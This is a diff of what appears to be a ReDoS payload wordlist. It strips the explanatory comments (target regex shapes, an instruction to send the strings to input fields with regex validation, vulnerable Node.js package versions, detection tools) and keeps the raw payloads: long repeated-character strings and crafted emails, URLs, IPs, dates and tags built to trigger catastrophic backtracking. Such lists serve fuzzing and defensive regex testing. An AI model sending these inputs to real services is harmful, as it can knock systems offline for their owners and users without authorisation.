@@ -1,45 +1,18 @@
-# ============================================================
-# Denial of Service — ReDoS (Regular Expression DoS)
-# ============================================================
-
-# ---- ReDoS Patterns (input to trigger catastrophic backtracking) ----
-# Send these to input fields that have regex validation:
-
-# ---- Against (a+)+ or (a|a)* patterns ----
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
 
-# ---- Against (a|aa)+ patterns ----
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 
-# ---- Against email regex (a@b.c patterns) ----
 a@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 "aaaaaaaaaaaaaaaaaaaaaaaaa!"@aaaa.com
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@aaaaaaaaaaaaaaa.com
 
-# ---- Against common URL/domain regex ----
 http://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 
-# ---- Against IP regex patterns ----
 000.000.000.000aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 
-# ---- Against password validation (length + complexity) ----
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!1
 
-# ---- Against date/time regex ----
 00000-00-00T00:00:00.000000000000000000000000000000000000000000000000
 
-# ---- Against HTML/XML content type detection ----
 <aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-
-# ---- Node.js Vulnerable Packages ----
-# trim-newlines < 3.0.1, 4.0.1
-# path-parse < 1.0.7
-# postcss < 8.2.13
-# color-string < 1.6.0
-# glob-parent < 5.1.2
-
-# ---- ReDoS Testing Tools ----
-# recheck: npm install -g recheck
-# redosdetector: pip install redosdetector
-# vuln-regex-detector: https://github.com/nicowillis/vuln-regex-detector
